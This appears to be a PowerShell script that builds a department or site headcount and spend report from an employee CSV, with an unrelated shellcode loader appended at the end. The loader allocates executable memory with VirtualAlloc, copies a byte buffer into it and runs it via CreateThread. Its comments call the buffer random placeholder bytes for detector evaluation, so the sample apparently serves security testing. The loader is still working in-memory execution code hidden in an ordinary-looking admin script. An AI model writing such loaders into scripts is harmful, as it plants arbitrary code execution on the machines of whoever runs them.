
<#
.SYNOPSIS
    Reads an exported employee CSV and writes an aggregated summary report.
.DESCRIPTION
    Validates the column layout of the source file, converts the Amount column
    to a number and aggregates headcount and spend per department or site.
    Missing columns are reported as a hard error so a changed export cannot
    silently produce an empty report.
.PARAMETER InputCsv
    Overrides the default value defined in the parameter block.
.PARAMETER OutputPath
    Used when the script runs unattended.
.EXAMPLE
    .\Export-HeadcountReport.ps1 -InputCsv C:\Scripts\data\headcount-export.csv
.EXAMPLE
    .\Export-HeadcountReport.ps1 -GroupBy Site -MinAmount 10000
#>

[CmdletBinding()]
param(
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [string]$InputCsv = 'C:\Scripts\data\headcount-export.csv',
    [string]$OutputPath = "D:\Ops\reports\headcount-summary-2026-02-15.csv",

    [Parameter(Mandatory = $false)]
    [ValidateSet('Department', "Site")]
    [string]$GroupBy = 'Department',
    [double]$MinAmount = 10000
)

if (-not (Test-Path -LiteralPath $InputCsv)) {
    throw ("Input file not found: {0}" -f $InputCsv)
}
$rows = Import-Csv -LiteralPath $InputCsv -Delimiter ','
if (@($rows).Count -eq 0) {
    throw 'The input CSV contains no data rows.'
}
$required = @('EmployeeId', 'Name', 'Department', 'Site', 'Amount')
$available = $rows[0].PSObject.Properties.Name
$missing = @($required | Where-Object { $available -notcontains $_ })
if ($missing.Count -gt 0) {
    throw ("Missing column(s): {0}" -f ($missing -join ', '))
}
$rows | ForEach-Object { $_.Amount = [double]$_.Amount }
$byGroup = $rows | Group-Object -Property $GroupBy | ForEach-Object {
    $sum = ($_.Group | Measure-Object -Property Amount -Sum).Sum
    [pscustomobject]@{
        Group     = $_.Name
        Metric    = $GroupBy
        Employees = $_.Count
        Total     = [math]::Round($sum, 2)
        Average   = [math]::Round(($sum / $_.Count), 2)
    }
}

$grandTotal = [math]::Round((($rows | Measure-Object -Property Amount -Sum).Sum), 2)
$rowCount = @($rows).Count

$byGroup | Sort-Object -Property Total -Descending | Export-Csv -NoTypeInformation -Path $OutputPath -Encoding UTF8

$aboveThreshold = $byGroup | Where-Object { $_.Total -ge $MinAmount }
$aboveThreshold | Export-Csv -Path $OutputPath.Replace('.csv', '-filtered.csv') -NoTypeInformation -Encoding UTF8

$bySite = $rows | Group-Object -Property Site | ForEach-Object {
    [pscustomobject]@{
        Site      = $_.Name
        Employees = $_.Count
        Total     = [math]::Round((($_.Group | Measure-Object -Property Amount -Sum).Sum), 2)
    }
}
$bySite | Sort-Object -Property Total -Descending | Format-Table -AutoSize

$duplicates = $rows | Group-Object -Property EmployeeId |
    Where-Object { $_.Count -gt 1 } |
    Select-Object Name, Count
if (@($duplicates).Count -gt 0) {
    Write-Warning ("Duplicate employee ids: {0}" -f @($duplicates).Count)
}

$byManager = $rows | Group-Object -Property Manager |
    Sort-Object -Property Count -Descending | Select-Object -First 5
$byManager | Format-Table -AutoSize

$style = @'
<style>
body { font-family: Arial; font-size: 13px; }
table { border-collapse: collapse; width: 100%; }
th { background: #f0f0f0; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@

$byGroup | Sort-Object -Property Total -Descending |
    ConvertTo-Html -Title 'Headcount summary' -Head $style |
    Set-Content -Path $OutputPath.Replace('.csv', '.html') -Encoding UTF8
$byGroup | ConvertTo-Json -Depth 4 | Set-Content -Path $OutputPath.Replace('.csv', '.json') -Encoding UTF8

$bySite | Export-Csv -Path $OutputPath.Replace('.csv', '-by-site.csv') -NoTypeInformation -Encoding UTF8

$summaryBody = @"
Rows processed : $rowCount
Grand total    : $grandTotal
Groups         : $($byGroup.Count)
Output         : $OutputPath
"@

$MailTo = 'reporting@contoso.com'
$MailFrom = "bi@contoso.com"

Send-MailMessage `
    -To $MailTo `
    -From $MailFrom `
    -Subject 'Headcount summary' `
    -Body $summaryBody `
    -SmtpServer 'smtp.contoso.com' `
    -Port 25 `
    -UseSsl

Write-Host ("Report written to {0}" -f $OutputPath) -ForegroundColor Green
Write-Verbose ("Filtered groups above threshold: {0}" -f @($aboveThreshold).Count)

$culture = [System.Globalization.CultureInfo]::GetCultureInfo('en-US')
$formatted = $grandTotal.ToString('C2', $culture)
Write-Verbose ("Formatted total: {0}" -f $formatted)

$byCostCenter = $rows | Where-Object { $_.PSObject.Properties.Name -contains 'CostCenter' } |
    Group-Object -Property CostCenter | Sort-Object -Property Count -Descending | Select-Object -First 5
$byCostCenter | Format-Table Name, Count -AutoSize

$average = ($rows | Measure-Object -Property Amount -Average).Average
Write-Verbose ("Average amount: {0:N2}" -f $average)

$largest = $rows | Sort-Object -Property Amount -Descending | Select-Object -First 5
$largest | Format-Table Name, Department, Amount -AutoSize

$outputDir = Split-Path -Parent $OutputPath
if (-not (Test-Path -LiteralPath $outputDir)) {
    New-Item -Path $outputDir -ItemType Directory -Force | Out-Null
}

$sample = $rows | Select-Object -First 3
$sample | Format-Table -AutoSize | Out-String | Write-Verbose

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)
<#
.SYNOPSIS
    Loads a prepared binary buffer into committed memory and starts it
    on a worker thread.

.DESCRIPTION
    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
    into it, starts a thread and waits for completion. The buffer is a
    placeholder supplied for static-analysis exercises.

.NOTES
    Sample generated for detector evaluation. No real payload is used.
#>
try {
    $NativeCode = @"
    using System;
    using System.Runtime.InteropServices;

    public static class Win32Api
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
            uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
    "@

    Add-Type -TypeDefinition $NativeCode -Language CSharp

    # buffer placeholder: random bytes, replaces the encrypted stage in real samples
    $Buffer = [Byte[]] @(
        0xf4, 0xb5, 0xfb, 0xb4, 0x71, 0x53, 0x8a, 0xf0, 0xa6, 0xbd, 0xd8, 0x0d, 0x75, 0x40, 0x35, 0x0f,
        0x19, 0xce, 0xf3, 0x77, 0xb3, 0xc2, 0x6f, 0x2f, 0x7d, 0x76, 0xc2, 0x7d, 0x97, 0xf5, 0xa2, 0x6e,
        0x6a, 0x82, 0x41, 0x2c, 0xef, 0x6c, 0x3a, 0xc7, 0xdf, 0xd3, 0xcb, 0xf1, 0x49, 0xb4, 0xbe, 0xdf,
        0x01, 0x8e, 0xd2, 0x2c, 0x20, 0x3b, 0x27, 0x7c, 0x71, 0x8e, 0x41, 0xcc, 0xe5, 0xbb, 0x77, 0x9d,
        0xe0, 0x3c, 0x4e, 0xe7, 0x30, 0xcb, 0x01, 0xc1, 0xc8, 0x2a, 0x61, 0xce, 0x26, 0xc3, 0x2c, 0x14,
        0xa1, 0x25, 0xf2, 0xef, 0x21, 0xcc, 0x4a, 0x22, 0xbf, 0xd2, 0x24, 0x15, 0x0f, 0xc0, 0xa9, 0x87,
        0x0f, 0xad, 0x52, 0xa2, 0xd4, 0x75, 0xdd, 0x40, 0xc4, 0x94, 0x77, 0x13, 0x40, 0x5a, 0xc6, 0x9e,
        0xd8, 0x2c, 0xad, 0x05, 0x9c, 0xcd, 0x38, 0x46, 0xa7, 0xbb, 0x65, 0xa1, 0xe8, 0x8b, 0x05, 0x61,
        0xff, 0x3e, 0x86, 0x79, 0x5a, 0x06, 0x8d, 0xe3, 0x4d, 0x2e, 0x91, 0xc1, 0x28, 0xf0, 0x05, 0x57,
        0x96, 0xae, 0x1c, 0x22, 0xd5, 0x06, 0x3a, 0x01, 0x7c, 0x04, 0x94, 0x29, 0x9d, 0x82, 0x6b, 0x01,
        0xd0, 0x21, 0x42, 0x67, 0x52, 0x45, 0x79, 0x40, 0x4d, 0xa3, 0x7d, 0xa6, 0xfc, 0x75, 0x00, 0x32,
        0x47, 0x36, 0xde, 0x29, 0xbe, 0x00, 0x68, 0x7a, 0xf7, 0x7f, 0x04, 0x5a, 0x40, 0x15, 0xa7, 0x7c,
        0xc9, 0x2e, 0xba, 0x14, 0x19, 0x97, 0x26, 0xde, 0x48, 0xc6, 0x7f, 0x99, 0xb1, 0x74, 0xd8, 0x0e,
        0xed, 0xd7, 0xf7, 0x40, 0x6a, 0x35, 0xb7, 0x89, 0xdb, 0x40, 0x9d, 0x33, 0xda, 0xae, 0xaf, 0xbc,
        0xf8, 0x3e, 0x9d, 0x30, 0x80, 0x68, 0xcf, 0x61, 0x4d, 0x64, 0x01, 0xd8, 0x32, 0x0b, 0x5f, 0x55,
        0xbc, 0xc3, 0xdb, 0xdc, 0x72, 0xa9, 0xb7, 0xca, 0xf6, 0x8f, 0x3e, 0x7c, 0x68, 0x8a, 0x5e, 0x3f,
        0x77, 0x59, 0x62, 0xca, 0x8f, 0x6e, 0x07, 0x0f, 0x08, 0x91, 0x3a, 0x50, 0xd0, 0xda, 0x8a, 0xe5,
        0x50, 0xad, 0x37, 0x9d, 0x21, 0x34, 0xf3, 0x4d, 0x3e, 0x27, 0xb0, 0x6c, 0xb0, 0x9f, 0x41, 0x42,
        0xa7, 0x46, 0x7f, 0xdd, 0xc6, 0x98, 0x70, 0xa3, 0xa4, 0x83, 0xbe, 0xee, 0x3b, 0xcd, 0x95, 0x03,
        0xcc, 0xd8, 0x0d, 0x84, 0x15, 0xef, 0xfd, 0xaa, 0x86, 0x6e, 0x52, 0x2e, 0xb7, 0x3d, 0x34, 0x79,
        0x58, 0xcd, 0x57, 0x36, 0xaf, 0x82, 0x30, 0x4e, 0xa8, 0xe6, 0x4b, 0x52, 0xfb, 0x0c, 0x7f, 0xfe,
        0x4e, 0xc9, 0xac, 0xac, 0xe7, 0x8e, 0x8e, 0x5c, 0xc9, 0x56, 0x3f, 0x2e, 0xbd, 0x39, 0x30, 0x7c,
        0xc0, 0x90, 0xc5, 0x61, 0xb0, 0x36, 0x54, 0xbd, 0x12, 0x6e, 0x6b, 0xd9, 0xe0, 0xc5, 0xc7, 0x71,
        0xe5, 0x53, 0xb0, 0xa2, 0x95, 0xf8, 0xc1, 0x96, 0x08, 0x19, 0x7d, 0x5e, 0xd9, 0x34, 0xf5, 0xd5,
        0xd8, 0x99, 0x63, 0x46, 0xb3, 0x2b, 0x81, 0x8a, 0x2a, 0x6a, 0x1b, 0xaf, 0x65, 0xfc, 0xd7, 0xe5,
        0x29, 0xd0, 0xe1, 0xa7, 0xc7, 0x56, 0x2b, 0x24, 0x8b, 0x97, 0xe1, 0x85, 0xa8, 0x15, 0x5c, 0x28,
        0x69, 0x5f, 0x14, 0xac, 0x97, 0x8b, 0xdf, 0xad, 0xc2, 0xc2, 0x83, 0xf1, 0xbe, 0x35, 0x28, 0x12,
        0x1b, 0x06, 0xb5, 0xfa, 0x08, 0x12, 0x44, 0x52, 0xce, 0xe6, 0xb3, 0xe4, 0x18, 0xe0, 0x7c, 0x41,
        0x03, 0xb0, 0x7d, 0x27, 0xdf, 0xe4, 0xa8, 0x4f, 0x90, 0xd6, 0x9d, 0xc7, 0x9c, 0x33, 0xd6, 0x06,
        0x48, 0x67, 0xf5, 0xbd, 0xf1, 0xc2, 0xac, 0xf0, 0x7b, 0xa1, 0xc6, 0xc2, 0xf1, 0x59, 0xb5, 0x51,
        0x60, 0x30, 0x14, 0x1d, 0x6d, 0xe9, 0x47, 0x92, 0x2f, 0xab, 0x1b, 0xff, 0x22, 0x4e, 0xe6, 0xe8,
        0xb3, 0x3e, 0xbd, 0x7a, 0x12, 0xa9, 0x44, 0x67, 0xac, 0xaa, 0x0d, 0x45, 0x55, 0x04, 0x50, 0x2b,
        0x36, 0x45, 0x43, 0x77, 0x64, 0xdd, 0xdd, 0x39, 0xb4, 0x66, 0xf9, 0xd1, 0x29, 0x59, 0xc1, 0x5c,
        0xc5, 0x88, 0xfd, 0xcb, 0x44, 0xd6, 0xd6, 0xb3, 0xfc, 0x5d, 0x82, 0x56, 0x5b, 0x90, 0x0c, 0xbb,
        0x4b, 0x46, 0x00, 0x42, 0xcb, 0x97, 0x55, 0xb8, 0x9b, 0xef, 0x5a, 0x46, 0xf0, 0xa9, 0x17, 0x56,
        0xe6, 0x6d, 0xfb, 0x6d, 0x1e, 0x78, 0x1b, 0x57, 0x80, 0x2f, 0x4b, 0x9b, 0xbb, 0xab, 0x4d, 0x0f,
        0x1f, 0x82, 0x99, 0x2f, 0x8b, 0x36, 0xcf, 0x4b, 0xfc, 0x5f, 0x7a, 0x31, 0x4d, 0x74, 0x29, 0x88,
        0x47, 0x0b, 0xc9, 0x98, 0xc7, 0x84, 0xe8, 0x48, 0x31, 0x95, 0x5e, 0x5e, 0x1c, 0x1a, 0x8b, 0xe6,
        0x1a, 0x21, 0x6d, 0x6e, 0xe3, 0xbc, 0x6f, 0x73, 0x42, 0xa7, 0x53, 0x82, 0xa2, 0x22, 0x0e, 0x32,
        0x1e, 0x5a, 0x5d, 0x10, 0x79, 0xcc, 0xc9, 0x40, 0xf6, 0x6b, 0x5e, 0x1b, 0x3d, 0x39, 0x45, 0x14,
        0x1a, 0x13, 0xf8, 0x23, 0x8f, 0x48, 0x03, 0x3c, 0xdf, 0x5d, 0x3f, 0x71, 0x74, 0x19, 0xe4
    )

    $ProcHandle = [Win32Api]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
    if ($ProcHandle -eq [IntPtr]::Zero) {
        Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        return
    }

    [Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $ProcHandle, $Buffer.Length)
    $ThreadId = 0
    $Thread = [Win32Api]::CreateThread([IntPtr]::Zero, 0, $ProcHandle, [IntPtr]::Zero, 0, [ref]$ThreadId)
    [void][Win32Api]::WaitForSingleObject($Thread, 2610)
    [void][Win32Api]::CloseHandle($Thread)

    $Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
    $Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
}
catch {
    Write-Warning "loader failed: $($_.Exception.Message)"
}
